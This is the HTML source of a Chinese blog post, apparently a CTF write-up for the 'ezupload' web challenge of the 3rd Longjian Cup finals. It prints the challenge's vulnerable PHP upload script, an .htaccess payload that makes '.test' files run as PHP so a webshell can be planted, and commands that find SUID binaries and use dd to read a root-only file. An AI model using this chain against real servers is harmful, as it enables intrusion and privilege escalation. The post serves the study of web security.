@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>第三届陇剑杯 总决赛 WEB Writeup | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="第三届陇剑杯 总决赛 WEB Writeup - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/ljb-3th-web-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/ljb-3th-web-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/ljb-3th-web-writeup/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="第三届陇剑杯 总决赛 WEB Writeup">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-04T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第三届陇剑杯 总决赛 WEB Writeup">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://z9nn8w.github.io/posts/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "第三届陇剑杯 总决赛 WEB Writeup",
+      "item": "https://z9nn8w.github.io/posts/ctf/ljb-3th-web-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第三届陇剑杯 总决赛 WEB Writeup",
+  "name": "第三届陇剑杯 总决赛 WEB Writeup",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": " 决赛一共4道web，提供附件的只有本文两题 附件可以从https://github.com/CTF-Archives/2025-LongjianCup-Finals中获取\nezupload index.php：\n\u003c?php session_start(); $session_id = session_id(); $target_dir = \"/var/www/html/uploads/$session_id/\"; if (!is_dir($target_dir)) { mkdir($target_dir, 0755, true); chown($target_dir, 'www-data'); chgrp($target_dir, 'www-data'); } ?\u003e \u003c?php if (isset($_FILES['fileToUpload'])) { $target_file = basename($_FILES[\"fileToUpload\"][\"name\"]); $session_id = session_id(); $target_dir = \"/var/www/html/uploads/$session_id/\"; $target_file_path = $target_dir . $target_file; $uploadOk = 1; $lastDotPosition = strrpos($target_file, '.'); if (file_exists($target_file_path)) { echo \"Sorry, file already exists.\\n\"; $uploadOk = 0; } if ($_FILES[\"fileToUpload\"][\"size\"] \u003e 50000) { echo \"Sorry, your file is too large.\\n\"; $uploadOk = 0; } if ($lastDotPosition == false) { $filename = $target_file; $extension = ''; } else { $filename = substr($target_file, 0, $lastDotPosition); $extension = substr($target_file, $lastDotPosition + 1); } if ($extension !== '' \u0026\u0026 $extension !== 'txt') { echo \"Sorry, only .txt extensions are allowed.\\n\"; $uploadOk = 0; } if (!(preg_match('/^[a-f0-9]{32}$/', $session_id))) { echo \"Sorry, that is not a valid session ID.\\n\"; $uploadOk = 0; } if ($uploadOk == 0) { echo \"Sorry, your file was not uploaded.\\n\"; } else { $temp_file_path = $target_dir . uniqid('temp_', true) . '.tmp'; if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $temp_file_path)) { chmod($temp_file_path, 0000); $is_hidden = (substr($target_file, 0, 1) === '.'); if ($is_hidden) { chmod($temp_file_path, 0644); } if (rename($temp_file_path, $target_file_path)) { echo \"The file \" . htmlspecialchars(basename($_FILES[\"fileToUpload\"][\"name\"])) . \" has been uploaded.\"; if (!$is_hidden) { chmod($target_file_path, 0000); } } else { echo \"Sorry, there was an error renaming your file.\"; if (file_exists($temp_file_path)) { unlink($temp_file_path); } } } else { echo \"Sorry, there was an error uploading your file.\"; } $old_path = getcwd(); chdir($target_dir); shell_exec('chmod 000 *'); chdir($old_path); } } ?\u003e 实现了文件上传的功能，Cookie值$session_id可控，也就是说上传目录是已知的，对于文件名有限制，如果是aaa.bbb的文件名则会对后缀进行校验，bbb必须为空或txt，并且文件如果上传成功是0000的属性，但如果是.xxx则可以绕过后缀校验，并且之后上传文件会被置为0644的属性，于是可以想到通过上传.htaccess实现解析.xxx文件：\n",
+  "wordCount" : "682",
+  "inLanguage": "en",
+  "datePublished": "2025-09-19T00:00:00Z",
+  "dateModified": "2025-10-04T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/ctf/ljb-3th-web-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      第三届陇剑杯 总决赛 WEB Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-09-19 00:00:00 +0000 UTC'>September 19, 2025</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#ezupload" aria-label="ezupload">ezupload</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>决赛一共4道web，提供附件的只有本文两题
+附件可以从<code>https://github.com/CTF-Archives/2025-LongjianCup-Finals</code>中获取</p></blockquote>
+<h2 id="ezupload">ezupload<a hidden class="anchor" aria-hidden="true" href="#ezupload">#</a></h2>
+<p>index.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$session_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">session_id</span>();
+</span></span><span style="display:flex;"><span>$target_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/www/html/uploads/</span><span style="color:#e6db74">$session_id</span><span style="color:#e6db74">/&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($target_dir)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mkdir</span>($target_dir, <span style="color:#ae81ff">0755</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chown</span>($target_dir, <span style="color:#e6db74">&#39;www-data&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chgrp</span>($target_dir, <span style="color:#e6db74">&#39;www-data&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;form enctype=&#39;multipart/form-data&#39; action=&#39;&#39; method=&#39;post&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;input type=&#39;file&#39; name=&#39;fileToUpload&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;input type=&#34;submit&#34; value=&#34;Upload&#34; name=&#34;submit&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">if (isset($_FILES[&#39;fileToUpload&#39;])) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $target_file = basename($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;]);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $session_id = session_id();
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $target_dir = &#34;/var/www/html/uploads/$session_id/&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $target_file_path = $target_dir . $target_file;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $uploadOk = 1;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $lastDotPosition = strrpos($target_file, &#39;.&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (file_exists($target_file_path)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;Sorry, file already exists.\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uploadOk = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($_FILES[&#34;fileToUpload&#34;][&#34;size&#34;] &gt; 50000) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;Sorry, your file is too large.\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uploadOk = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($lastDotPosition == false) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $filename = $target_file;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $extension = &#39;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $filename = substr($target_file, 0, $lastDotPosition);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $extension = substr($target_file, $lastDotPosition + 1);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($extension !== &#39;&#39; &amp;&amp; $extension !== &#39;txt&#39;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;Sorry, only .txt extensions are allowed.\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uploadOk = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (!(preg_match(&#39;/^[a-f0-9]{32}$/&#39;, $session_id))) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;Sorry, that is not a valid session ID.\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $uploadOk = 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($uploadOk == 0) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;Sorry, your file was not uploaded.\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $temp_file_path = $target_dir . uniqid(&#39;temp_&#39;, true) . &#39;.tmp&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if (move_uploaded_file($_FILES[&#34;fileToUpload&#34;][&#34;tmp_name&#34;], $temp_file_path)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            chmod($temp_file_path, 0000);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $is_hidden = (substr($target_file, 0, 1) === &#39;.&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($is_hidden) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                chmod($temp_file_path, 0644);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (rename($temp_file_path, $target_file_path)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;The file &#34; . htmlspecialchars(basename($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;])) . &#34; has been uploaded.&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (!$is_hidden) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    chmod($target_file_path, 0000);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#34;Sorry, there was an error renaming your file.&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (file_exists($temp_file_path)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    unlink($temp_file_path);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            echo &#34;Sorry, there was an error uploading your file.&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $old_path = getcwd();
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        chdir($target_dir);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        shell_exec(&#39;chmod 000 *&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        chdir($old_path);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
+</span></span></span></code></pre></div><p>实现了文件上传的功能，Cookie值<code>$session_id</code>可控，也就是说上传目录是已知的，对于文件名有限制，如果是<code>aaa.bbb</code>的文件名则会对后缀进行校验，bbb必须为空或txt，并且文件如果上传成功是<code>0000</code>的属性，但如果是<code>.xxx</code>则可以绕过后缀校验，并且之后上传文件会被置为<code>0644</code>的属性，于是可以想到通过上传<code>.htaccess</code>实现解析<code>.xxx</code>文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-.htaccess" data-lang=".htaccess"><span style="display:flex;"><span><span style="color:#f92672">&lt;FilesMatch</span> <span style="color:#e6db74">&#34;.test&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  SetHandler application/x-httpd-php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/FilesMatch&gt;</span>
+</span></span></code></pre></div><p>把一句话木马写进<code>.test</code>文件，先上传<code>.htaccess</code>，再上传<code>.test</code>就能蚁剑连接，<code>/tmp</code>目录下有个假flag，根目录下的flag只有root可读，需要进行提权，尝试先查找具有suid权限的文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>找到一个<code>dd</code>命令，可以复制flag文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>/flag of<span style="color:#f92672">=</span>/tmp/flag
+</span></span></code></pre></div><p>最后读取<code>/tmp/flag</code>就能获取flag</p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
